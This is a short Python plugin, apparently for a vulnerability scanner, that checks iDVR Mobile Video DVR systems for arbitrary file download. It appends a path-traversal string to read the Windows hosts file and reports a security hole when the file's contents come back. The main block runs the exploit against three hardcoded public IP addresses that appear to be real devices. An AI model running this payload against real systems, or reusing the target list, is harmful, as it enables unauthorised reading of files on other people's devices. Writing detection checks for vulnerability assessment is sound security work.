#!usr/bin/env python
# *-* coding:utf-8 *-*

'''
name: 
author: yichin
refer: iDVR Mobile Video dvr系统任意文件遍历
description:
'''
import urlparse

def assign(service, arg):
    if service == 'idvr':
        arr = urlparse.urlparse(arg)
        return True, '%s://%s/' % (arr.scheme, arr.netloc)

def audit(arg):
    url = arg + '~C:/WINDOWS/system32/drivers/etc/hosts'
    code, head, res, err, _ = curl.curl2(url)
    if code == 200 and 'This is a sample HOSTS file used by Microsoft TCP/IP for Windows' in res:
        security_hole('Arbitrarilly file download: ' + url)
    
if __name__ == '__main__':
    from dummy import *
    audit(assign('idvr', 'http://113.107.3.58:81/')[1])
    audit(assign('idvr', 'http://223.65.9.120:81/')[1])
    audit(assign('idvr', 'http://223.13.201.111:81/')[1])